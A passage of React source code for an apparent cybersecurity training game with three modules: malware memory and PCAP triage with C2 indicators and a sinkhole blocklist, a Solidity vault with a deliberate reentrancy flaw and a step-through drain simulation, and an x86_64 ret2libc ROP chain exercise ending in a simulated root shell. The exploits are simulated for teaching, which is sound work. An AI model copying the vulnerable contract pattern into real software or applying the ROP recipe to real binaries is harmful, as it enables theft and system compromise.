                  <div>BACKUP IP: 185.220.101.5</div>
                  <div>AES KEY: V4ult#K3y99!</div>
                </div>
              )}
            </div>

            {isDecrypted && (
              <button
                onClick={() => {
                  setActiveTab('pcap');
                  playCyberSound('click', soundEnabled);
                }}
                className="w-full py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-mono text-xs font-bold rounded-lg flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <span>Proceed to PCAP Triage</span>
                <ChevronRight className="w-4 h-4" />
              </button>
            )}
          </div>

          <div className="lg:col-span-7 bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs flex flex-col">
            <div className="text-slate-400 pb-2 mb-2 border-b border-slate-800 text-[11px] flex items-center justify-between">
              <span>MEMORY REGION HEX DUMP (OFFSET 0x0000021A4B001400)</span>
              <span className="text-purple-400">ACTIVE XOR: {xorKey}</span>
            </div>

            <pre className="flex-1 bg-[#0b1220] p-3 rounded border border-slate-800 text-slate-300 overflow-x-auto text-[11px] leading-relaxed whitespace-pre">
{xorKey === '0x5A' ? 
`00001400  43 32 3D 74 65 6C 65 6D  65 74 72 79 2D 73 79 6E  |C2=telemetry-syn|
00001410  63 2D 73 65 72 76 69 63  65 2E 74 6F 70 3B 50 4F  |c-service.top;PO|
00001420  52 54 3D 38 34 34 33 3B  42 41 43 4B 55 50 3D 31  |RT=8443;BACKUP=1|
00001430  38 35 2E 32 32 30 2E 31  30 31 2E 35 3B 41 45 53  |85.220.101.5;AES|
00001440  5F 4B 45 59 3D 56 34 75  6C 74 23 4B 33 79 39 39  |_KEY=V4ult#K3y99|
00001450  21 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |!...............|`
: xorKey === '0x33' ?
`00001400  20 51 5E 17 06 0F 06 0E  06 17 11 1A 4E 10 1A 0D  | Q^...........N..|
00001410  00 4E 10 06 11 15 0A 00  06 4D 17 0C 13 58 33 2C  |.N.......M...X3,|
00001420  31 37 5E 5B 57 57 50 58  21 22 20 28 36 33 5E 52  |17^[WWPX!" (63^R|
00001430  5B 56 4D 51 51 53 4D 52  53 52 4D 56 58 22 26 30  |[VMQQSMSRSMVX"&0|`
: 
`00001400  19 68 67 2E 3F 36 3F 37  3F 2E 28 23 77 29 23 34  |.hg.?6?7?.(#w)#4|
00001410  39 77 29 3F 28 2C 33 39  3F 74 2E 35 2A 61 0A 15  |9w)?(,39?t.5*a..|
00001420  08 0E 67 62 6E 6E 69 61  18 1B 19 11 0F 0A 67 6B  |..gbnnia......gk|
00001430  62 6F 74 68 68 6A 74 6B  6A 6B 74 6F 61 1B 1F 09  |bothhjtjkjtoa...|`}
            </pre>
          </div>
        </div>
      )}

      {/* Tab 3: PCAP & Containment Blocklist */}
      {activeTab === 'pcap' && (
        <div className="space-y-4">
          <div className="bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs">
            <div className="flex items-center justify-between pb-2 mb-3 border-b border-slate-800 text-[11px] text-slate-400">
              <span className="flex items-center gap-1.5 text-cyan-400 font-bold">
                <Network className="w-4 h-4" /> PCAP PACKET DISSECTION // TLS CLIENT HELLO
              </span>
              <span className="text-slate-500">FILTER: tcp.port == 8443</span>
            </div>

            <div className="bg-[#0b1220] p-3 rounded border border-slate-800 text-slate-300 text-[11px] leading-relaxed space-y-2">
              <div className="text-cyan-300 font-bold">FRAME 428: TLSv1.3 Handshake Client Hello</div>
              <div>• Source: 10.0.4.15:49182 (WS-EXEC-FL04)</div>
              <div>• Destination: 185.220.101.5:8443</div>
              <div>• Server Name Indication (SNI): <span className="text-amber-300 font-bold">telemetry-sync-service.top</span></div>
              <div>• JA3 Fingerprint: 51c64bbabdec6620686450a37420f9b8 (Cobalt Strike Malleable C2 profile)</div>
              <div>• Heartbeat Beacon Interval: Every 60s (Jitter 15%)</div>
            </div>
          </div>

          {/* Firewall Containment Form */}
          <div className="bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs space-y-3">
            <h4 className="font-bold text-white flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-rose-400" />
              EMERGENCY FIREWALL & EDR CONTAINMENT
            </h4>
            <p className="text-slate-400 text-xs">
              Enter the confirmed malicious C2 domain or backup IP address to inject into the enterprise perimeter sinkhole and isolate the workstation.
            </p>

            <div className="flex flex-col sm:flex-row gap-2">
              <input
                type="text"
                value={firewallBlockInput}
                onChange={(e) => setFirewallBlockInput(e.target.value)}
                placeholder="Enter IOC (e.g. telemetry-sync-service.top or 185.220.101.5)"
                className="flex-1 px-3 py-2 bg-[#0b1220] border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-purple-400"
              />
              <button
                onClick={handleApplyBlock}
                className="px-5 py-2 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(225,29,72,0.4)]"
              >
                <Crosshair className="w-4 h-4" />
                <span>APPLY SINKHOLE BLOCK</span>
              </button>
            </div>

            {errorMsg && (
              <div className="p-2 bg-rose-950/60 border border-rose-800 text-rose-300 rounded text-xs">
                {errorMsg}
              </div>
            )}

            {blockConfirmed && (
              <div className="p-3 bg-emerald-950/60 border border-emerald-700 text-emerald-300 rounded text-xs flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>IOC SINKHOLED: telemetry-sync-service.top isolated across all gateways. Workstation containment complete!</span>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

/* ========================================================================= */
/* MODULE 4: SMART CONTRACT LOGIC FLAW (DEFI REENTRANCY AUDIT & EXPLOIT)     */
/* ========================================================================= */

const SmartContractAuditModule: React.FC<ModuleProps> = ({ soundEnabled, isCompleted, onComplete }) => {
  const [selectedVulnerableLine, setSelectedVulnerableLine] = useState<number | null>(null);
  const [exploitStep, setExploitStep] = useState<number>(0);
  const [vaultBalance, setVaultBalance] = useState<number>(10);
  const [attackerBalance, setAttackerBalance] = useState<number>(1);
  const [callDepth, setCallDepth] = useState<number>(0);
  const [isPatched, setIsPatched] = useState<boolean>(false);
  const [auditPassed, setAuditPassed] = useState<boolean>(false);

  const SOLIDITY_CODE = [
    { line: 1, text: '// SPDX-License-Identifier: MIT' },
    { line: 2, text: 'pragma solidity ^0.8.19;' },
    { line: 3, text: '' },
    { line: 4, text: 'contract LendingPoolVault {' },
    { line: 5, text: '    mapping(address => uint256) public balances;' },
    { line: 6, text: '' },
    { line: 7, text: '    function deposit() external payable {' },
    { line: 8, text: '        balances[msg.sender] += msg.value;' },
    { line: 9, text: '    }' },
    { line: 10, text: '' },
    { line: 11, text: '    function withdrawFunds(uint256 amount) external {' },
    { line: 12, text: '        require(balances[msg.sender] >= amount, "Insufficient balance");' },
    { line: 13, text: '        // FLAGGED: External call sent BEFORE state balance updated!' },
    { line: 14, text: '        (bool sent, ) = msg.sender.call{value: amount}("");' },
    { line: 15, text: '        require(sent, "Transfer failed");' },
    { line: 16, text: '        balances[msg.sender] -= amount;' },
    { line: 17, text: '    }' },
    { line: 18, text: '}' }
  ];

  const handleLineClick = (lineNum: number) => {
    setSelectedVulnerableLine(lineNum);
    playCyberSound('keystroke', soundEnabled);
  };

  const executeReentrantStep = () => {
    playCyberSound('click', soundEnabled);
    if (exploitStep === 0) {
      // Step 1: Deposit 1 ETH
      setExploitStep(1);
      setAttackerBalance(0);
      setVaultBalance(11);
      setCallDepth(1);
    } else if (exploitStep === 1) {
      // Step 2: Trigger initial withdraw call
      setExploitStep(2);
      setCallDepth(2);
      setAttackerBalance(1);
      setVaultBalance(10);
    } else if (exploitStep === 2) {
      // Step 3: Malicious fallback calls withdraw again before balance -= amount!
      setExploitStep(3);
      setCallDepth(3);
      setAttackerBalance(4);
      setVaultBalance(7);
    } else if (exploitStep === 3) {
      // Step 4: Cascade reentrancy drains vault
      setExploitStep(4);
      setCallDepth(4);
      setAttackerBalance(11);
      setVaultBalance(0);
      playCyberSound('powerup', soundEnabled);
    }
  };

  const applyHotfix = () => {
    setIsPatched(true);
    setAuditPassed(true);
    playCyberSound('success', soundEnabled);
    onComplete();
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-800/80 px-2 py-0.5 rounded">
              SMART CONTRACT: LendingPoolVault.sol
            </span>
            <span className="text-xs font-mono text-slate-400">NETWORK: ETHEREUM SEPOLIA DEPLOYMENT</span>
          </div>
          <h3 className="text-xl font-bold font-mono text-white">Smart Contract Logic Flaw & Reentrancy Audit</h3>
          <p className="text-xs text-slate-400">
            Identify the state update race condition violating the Check-Effects-Interactions pattern, step through EVM reentrant call stack execution, and deploy a secure nonReentrant guard.
          </p>
        </div>

        <div className="flex items-center gap-3 font-mono text-xs">
          <div className="bg-[#050914] px-3 py-1.5 rounded-lg border border-slate-800">
            <span className="text-slate-400">Vault Balance: </span>
            <span className="text-emerald-400 font-bold">{vaultBalance} ETH</span>
          </div>
          <div className="bg-[#050914] px-3 py-1.5 rounded-lg border border-slate-800">
            <span className="text-slate-400">Attacker Balance: </span>
            <span className="text-amber-400 font-bold">{attackerBalance} ETH</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Interactive Solidity Code Inspector */}
        <div className="lg:col-span-7 bg-[#050914] border border-slate-800 rounded-xl p-4 font-mono text-xs flex flex-col">
          <div className="text-slate-400 pb-2 mb-2 border-b border-slate-800 text-[11px] flex items-center justify-between">
            <span className="flex items-center gap-1.5 text-emerald-400 font-bold">
              <Code className="w-4 h-4" /> LendingPoolVault.sol
            </span>
            <span className="text-slate-500">Click line to flag vulnerability</span>
          </div>

          <div className="bg-[#0b1220] p-3 rounded border border-slate-800 divide-y divide-slate-800/40 text-[11px] leading-relaxed">
            {SOLIDITY_CODE.map(line => {
              const isSelected = selectedVulnerableLine === line.line;
              const isVuln = line.line === 14;
              return (
                <div
                  key={line.line}
                  onClick={() => handleLineClick(line.line)}
                  className={`py-0.5 px-2 flex items-center gap-3 cursor-pointer rounded transition-colors ${
                    isSelected
                      ? isVuln
                        ? 'bg-rose-950/70 text-rose-200 border-l-2 border-rose-500'
                        : 'bg-amber-950/50 text-amber-200 border-l-2 border-amber-500'
                      : 'hover:bg-slate-800/60 text-slate-300'
                  }`}
                >
                  <span className="w-5 text-slate-600 text-[10px] select-none text-right">{line.line}</span>
                  <span className="font-mono">{line.text}</span>
                </div>
              );
            })}
          </div>

          {selectedVulnerableLine === 14 ? (
            <div className="mt-3 p-2.5 bg-rose-950/40 border border-rose-800 rounded text-rose-300 text-xs font-mono">
              ✓ CORRECT VULNERABILITY LOCATED: Line 14 performs external call msg.sender.call&#123;value&#125; before Line 16 decrements balances[msg.sender].
            </div>
          ) : selectedVulnerableLine !== null ? (
            <div className="mt-3 p-2.5 bg-slate-900 border border-slate-800 rounded text-slate-400 text-xs font-mono">
              Line {selectedVulnerableLine} is standard Solidity. Look at the order of operations in `withdrawFunds`.
            </div>
          ) : null}
        </div>

        {/* Right: Simulated EVM Call Stack & Exploit Replayer */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-4 bg-[#050914] border border-slate-800 rounded-xl font-mono text-xs">
            <h4 className="font-bold text-emerald-400 mb-2 flex items-center gap-1.5">
              <Zap className="w-4 h-4" /> EVM CALL STACK REENTRANCY REPLAY
            </h4>
            <p className="text-slate-300 text-xs mb-3 leading-relaxed">
              Step through the attacker callback contract executing reentrant withdrawals before storage state write:
            </p>

            <div className="space-y-2 mb-4">
              <div className="p-2.5 bg-[#0b1220] rounded border border-slate-800 text-[11px] text-slate-300">
                <div className="text-slate-500 mb-1">REENTRANCY DEPTH: {callDepth} / 4</div>
                <div className="w-full bg-slate-800 h-2 rounded overflow-hidden">
                  <div
                    className="bg-emerald-400 h-full transition-all duration-300"
                    style={{ width: `${(callDepth / 4) * 100}%` }}
                  />
                </div>
              </div>

              <div className="p-2.5 bg-[#0b1220] rounded border border-slate-800 text-[11px] text-slate-300 min-h-[90px]">
                {exploitStep === 0 && 'Attacker prepares malicious fallback contract and approves 1 ETH deposit.'}
                {exploitStep === 1 && 'Deposit confirmed. LendingPoolVault total liquidity: 11 ETH.'}
                {exploitStep === 2 && 'Withdraw(1 ETH) initiated. Vault invokes msg.sender.call{} transfer.'}
                {exploitStep === 3 && 'Attacker fallback() receives ether and immediately invokes withdrawFunds(1 ETH) AGAIN before state decrement!'}
                {exploitStep === 4 && 'EXPLOIT SUCCESS: Loop drained entire 10 ETH liquidity pool to attacker wallet.'}
              </div>
            </div>

            <div className="space-y-2">
              <button
                onClick={executeReentrantStep}
                disabled={exploitStep >= 4}
                className={`w-full py-2 font-mono text-xs font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer ${
                  exploitStep >= 4
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed'
                    : 'bg-amber-500 hover:bg-amber-400 text-black shadow-[0_0_15px_rgba(245,158,11,0.3)]'
                }`}
              >
                <Play className="w-3.5 h-3.5" />
                <span>{exploitStep === 0 ? 'START EXPLOIT TRANSACTION' : `STEP EVM TRANSACTION (${exploitStep}/4)`}</span>
              </button>

              {exploitStep === 4 && !isPatched && (
                <button
                  onClick={applyHotfix}
                  className="w-full py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-mono text-xs font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(16,185,129,0.3)]"
                >
                  <ShieldCheck className="w-4 h-4" />
                  <span>APPLY OPENZEPPELIN NONREENTRANT HOTFIX</span>
                </button>
              )}
            </div>
          </div>

          {auditPassed && (
            <div className="p-3 bg-emerald-950/60 border border-emerald-700 text-emerald-300 rounded-lg text-xs font-mono space-y-1">
              <div className="font-bold flex items-center gap-1.5">
                <CheckCircle2 className="w-4 h-4" /> AUDIT REMEDIATION CERTIFIED:
              </div>
              <p>ReentrancyGuard modifier applied. Check-Effects-Interactions pattern enforced (balances state updated before transfer). Liquidity pool protected.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

/* ========================================================================= */
/* MODULE 5: ADVANCED BINARY ANALYSIS & ROP (x86_64 RETURN-ORIENTED PWD)    */
/* ========================================================================= */

interface RopBlock {
  id: string;
  label: string;
  address: string;
  purpose: string;
}

const AVAILABLE_GADGETS: RopBlock[] = [
  { id: 'padding', label: 'Padding [72 bytes: "A"*72]', address: '0x00000000', purpose: 'Overwrite buffer (64) + saved RBP (8)' },
  { id: 'pop_rdi', label: 'pop rdi ; ret', address: '0x0040123b', purpose: 'Load first argument into RDI (System V ABI)' },
  { id: 'bin_sh', label: '"/bin/sh" string pointer', address: '0x00402008', purpose: 'Pointer to shell string in .rodata' },
  { id: 'ret_align', label: 'ret (16-byte stack align)', address: '0x0040101a', purpose: 'Bypass glibc movaps 16-byte alignment fault' },
  { id: 'system_plt', label: 'system@plt', address: '0x00401060', purpose: 'Invoke system library call with RDI argument' },
  { id: 'junk_gadget', label: 'pop rsi ; pop r15 ; ret', address: '0x00401240', purpose: 'Superfluous register manipulation' }
];

const BinaryRopModule: React.FC<ModuleProps> = ({ soundEnabled, isCompleted, onComplete }) => {
  const [selectedChain, setSelectedChain] = useState<RopBlock[]>([]);
  const [bufferOffsetInput, setBufferOffsetInput] = useState('');
  const [offsetVerified, setOffsetVerified] = useState(false);
  const [simulationOutput, setSimulationOutput] = useState('');
  const [shellActive, setShellActive] = useState(false);
  const [shellCmd, setShellCmd] = useState('');
  const [shellLogs, setShellLogs] = useState<string[]>([]);

  const verifyOffset = () => {
    playCyberSound('click', soundEnabled);
    if (bufferOffsetInput.trim() === '72') {
      setOffsetVerified(true);
      setSimulationOutput(`[+] GDB-PEDA: Crash at cyclic pattern 0x3762413662413562 ('b5Ab6Ab7')
[+] Stack Frame Calculation:
    - Local buffer: 64 bytes (0x40)
    - Saved RBP frame: 8 bytes
    - Offset to RIP: 72 bytes verified!
[+] NX (No-Execute) is ACTIVE: Stack shellcode cannot execute. Return-Oriented Programming (ROP) chain required.`);
      playCyberSound('success', soundEnabled);
    } else {
      setSimulationOutput(`[-] Error: Offset ${bufferOffsetInput} is incorrect.
Consider: 'sub rsp, 0x40' allocates 64 bytes for the buffer, plus 8 bytes for x86_64 saved RBP.`);
      playCyberSound('error', soundEnabled);
    }
  };

  const addGadgetToChain = (gadget: RopBlock) => {
    playCyberSound('keystroke', soundEnabled);
    setSelectedChain(prev => [...prev, gadget]);
  };

  const removeGadgetFromChain = (index: number) => {
    playCyberSound('click', soundEnabled);
    setSelectedChain(prev => prev.filter((_, i) => i !== index));
  };

  const executeRopChain = () => {
    playCyberSound('click', soundEnabled);
    // Correct chain order:
    // 1. padding
    // 2. pop_rdi
    // 3. bin_sh
    // 4. ret_align
    // 5. system_plt
    const chainIds = selectedChain.map(g => g.id);
    const isValid = 
      chainIds.length === 5 &&
      chainIds[0] === 'padding' &&
      chainIds[1] === 'pop_rdi' &&
      chainIds[2] === 'bin_sh' &&
      chainIds[3] === 'ret_align' &&
      chainIds[4] === 'system_plt';

    if (isValid) {
      setShellActive(true);
      setSimulationOutput(`[+] Payload dispatched: 72 bytes padding + 4 ROP gadgets (32 bytes).
[+] CPU Register State:
    RDI -> 0x00402008 ("/bin/sh")
    RSP -> 0x7fffffffe050 (16-byte aligned)
    RIP -> 0x00401060 (system@plt)
[+] Spawning Interactive Root Shell... Type 'cat flag.txt' or 'id'`);
      setShellLogs([
        'root@secure-daemon:~# id',
        'uid=0(root) gid=0(root) groups=0(root)'
      ]);
      playCyberSound('powerup', soundEnabled);
      onComplete();
    } else {
      let debug = '[-] Exploit Failure / Segfault:\n';
      if (chainIds[0] !== 'padding') debug += '• Stack frame not smashed with exact 72-byte padding.\n';
      if (!chainIds.includes('pop_rdi') || !chainIds.includes('bin_sh')) debug += '• System V ABI requires RDI to point to "/bin/sh" string.\n';
      if (!chainIds.includes('ret_align')) debug += '• movaps alignment fault: x86_64 system() requires 16-byte RSP alignment. Insert a solitary "ret" gadget.\n';
      if (chainIds[chainIds.length - 1] !== 'system_plt') debug += '• Chain must terminate at system@plt to execute.\n';
      setSimulationOutput(debug);
      playCyberSound('error', soundEnabled);
    }
  };

  const handleShellCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!shellCmd.trim()) return;
    const cmd = shellCmd.trim();
    playCyberSound('keystroke', soundEnabled);
    let response = '';

    if (cmd === 'id') {
      response = 'uid=0(root) gid=0(root) groups=0(root)';
    } else if (cmd.includes('flag') || cmd.includes('cat')) {
      response = 'CYBERNETICS{ROP_CHAIN_RET2LIBC_x86_64_PWNED_2025}';
      playCyberSound('success', soundEnabled);
    } else if (cmd === 'uname -a') {
      response = 'Linux secure-gate 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux';
    } else if (cmd === 'ls') {
      response = 'flag.txt  gatekeeper_daemon  server.conf';
    } else {
      response = `root: command not found: ${cmd}`;
    }

    setShellLogs(prev => [...prev, `root@secure-daemon:~# ${cmd}`, response]);
    setShellCmd('');
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-cyan-400 bg-cyan-950/60 border border-cyan-800/80 px-2 py-0.5 rounded">
              BINARY: /usr/local/bin/gatekeeper_daemon
            </span>
            <span className="text-xs font-mono text-slate-400">ARCH: x86_64 ELF // NX ENABLED // NO CANARY</span>
          </div>
          <h3 className="text-xl font-bold font-mono text-white">Advanced Binary Analysis & Return-Oriented Programming (ROP)</h3>
          <p className="text-xs text-slate-400">
            Deconstruct the x86_64 stack frame layout, calculate cyclic offset to the saved instruction pointer (RIP), and chain gadget primitives to defeat NX and spawn a root shell.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: GDB Disassembly & Stack Layout */}
        <div className="lg:col-span-6 space-y-4">
          <div className="p-3.5 bg-[#050914] border border-slate-800 rounded-xl font-mono text-xs">
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-800 text-[11px] text-slate-400">
              <span className="text-cyan-400 font-bold flex items-center gap-1.5">
                <Cpu className="w-4 h-4" /> DISASSEMBLY (intel syntax)
              </span>
              <span>FUNCTION: vuln()</span>
            </div>

            <pre className="bg-[#0b1220] p-2.5 rounded border border-slate-800 text-[11px] text-slate-300 leading-relaxed overflow-x-auto whitespace-pre">
{`0x00401156 <vuln+0>:     push   rbp
0x00401157 <vuln+1>:     mov    rbp,rsp
0x0040115a <vuln+4>:     sub    rsp,0x40           ; 64 bytes buffer on stack
0x0040115e <vuln+8>:     lea    rax,[rbp-0x40]
0x00401162 <vuln+12>:    mov    rdi,rax
0x00401165 <vuln+15>:    call   0x401040 <gets@plt> ; VULNERABLE: unbounded gets()
0x0040116a <vuln+20>:    leave
0x0040116b <vuln+21>:    ret`}
            </pre>

            {/* Step 1: Offset Verification */}
            <div className="mt-4 pt-3 border-t border-slate-800 space-y-2">
              <label className="text-slate-400 block text-xs">
                Step 1: Calculate Total Bytes to Overwrite Saved RIP:
              </label>
              <div className="flex gap-2">
                <input
                  type="number"
                  value={bufferOffsetInput}
                  onChange={(e) => setBufferOffsetInput(e.target.value)}
                  placeholder="e.g. 72"
                  className="flex-1 px-3 py-1.5 bg-[#0b1220] border border-slate-700 rounded text-slate-200 text-xs focus:outline-none focus:border-cyan-400"
                />
                <button
                  onClick={verifyOffset}
                  className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded font-bold text-xs cursor-pointer"
                >
                  Verify Offset
                </button>
              </div>
            </div>
          </div>

          {/* Gadget Picker Inventory */}
          <div className="p-3.5 bg-[#050914] border border-slate-800 rounded-xl font-mono text-xs">
            <h4 className="font-bold text-cyan-400 mb-2 flex items-center gap-1.5">
              <Binary className="w-4 h-4" /> DISCOVERED ROP GADGETS (ROPGadget / ropper)
            </h4>
            <div className="space-y-1.5">
              {AVAILABLE_GADGETS.map(g => (
                <div
                  key={g.id}
                  onClick={() => addGadgetToChain(g)}
                  className="p-2 bg-[#0b1220] hover:bg-slate-800 border border-slate-800 rounded flex items-center justify-between cursor-pointer transition-colors"
                >
                  <div>
                    <span className="text-amber-300 font-bold">{g.label}</span>
                    <span className="text-slate-500 text-[10px] ml-2">({g.purpose})</span>
                  </div>
                  <span className="text-cyan-400 text-[10px] bg-slate-900 px-1.5 py-0.5 rounded border border-slate-700">
                    + Insert
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right: ROP Chain Assembler & Shell Terminal */}
        <div className="lg:col-span-6 space-y-4">
          <div className="p-4 bg-[#050914] border border-slate-800 rounded-xl font-mono text-xs">
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-800">
              <span className="font-bold text-white flex items-center gap-1.5">
                <Layers className="w-4 h-4 text-cyan-400" /> STACK PAYLOAD CONSTRUCTOR
              </span>
              <button
                onClick={() => setSelectedChain([])}
                className="text-[10px] text-slate-400 hover:text-rose-400 cursor-pointer"
              >
                Clear Chain
              </button>
            </div>

            <p className="text-slate-400 text-[11px] mb-3 leading-relaxed">
              Arrange gadgets in order of stack execution. Remember: System V AMD64 ABI passes `rdi = &"/bin/sh"` and requires 16-byte stack alignment.
            </p>

            <div className="space-y-1.5 min-h-[140px] bg-[#0b1220] p-2.5 rounded border border-slate-800">
              {selectedChain.length === 0 ? (
                <div className="text-slate-500 text-center py-8 text-xs">
                  Click gadgets from the inventory to construct the ROP chain.
                </div>
              ) : (
                selectedChain.map((g, idx) => (
                  <div
                    key={`${g.id}-${idx}`}
                    className="p-1.5 bg-slate-900 border border-cyan-800/60 rounded flex items-center justify-between text-xs"
                  >
                    <span className="flex items-center gap-2">
                      <span className="text-slate-500 text-[10px]">[{idx}]</span>
                      <span className="text-cyan-300 font-bold">{g.label}</span>
                    </span>
                    <button
                      onClick={() => removeGadgetFromChain(idx)}
                      className="text-rose-400 hover:text-rose-300 text-xs px-1 cursor-pointer"
                    >
                      ×
                    </button>
                  </div>
                ))
              )}
            </div>

            <button
              onClick={executeRopChain}
              className="mt-3 w-full py-2.5 bg-cyan-500 hover:bg-cyan-400 text-black font-bold rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(6,182,212,0.4)]"
            >
              <Flame className="w-4 h-4" />
              <span>DISPATCH ROP EXPLOIT PAYLOAD</span>
            </button>
          </div>

          {/* Interactive Root Shell / Console Output */}
          <div className="bg-[#050914] border border-slate-800 rounded-xl p-3 font-mono text-xs flex flex-col h-60">
            <div className="text-slate-400 pb-1.5 mb-1.5 border-b border-slate-800 text-[11px] flex items-center justify-between">
              <span className="text-emerald-400 font-bold flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5" /> PWN EXECUTION CONSOLE
              </span>
              <span className="text-slate-500">{shellActive ? 'ROOT SHELL ACTIVE' : 'AWAITING PAYLOAD'}</span>
            </div>

            <div className="flex-1 overflow-y-auto space-y-1 text-[11px] text-slate-300 pr-1">
              {simulationOutput && <div className="text-amber-300 whitespace-pre-wrap">{simulationOutput}</div>}
              {shellLogs.map((log, i) => (
                <div key={i} className="text-emerald-300">{log}</div>
              ))}
            </div>

            {shellActive && (
              <form onSubmit={handleShellCommand} className="mt-2 pt-2 border-t border-slate-800 flex items-center gap-2">
                <span className="text-emerald-400 font-bold">#</span>
                <input
                  type="text"
                  value={shellCmd}
                  onChange={(e) => setShellCmd(e.target.value)}
                  placeholder="type: cat flag.txt or id"
                  className="flex-1 bg-transparent text-emerald-200 focus:outline-none text-xs font-mono"
                  autoFocus
                />
              </form>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
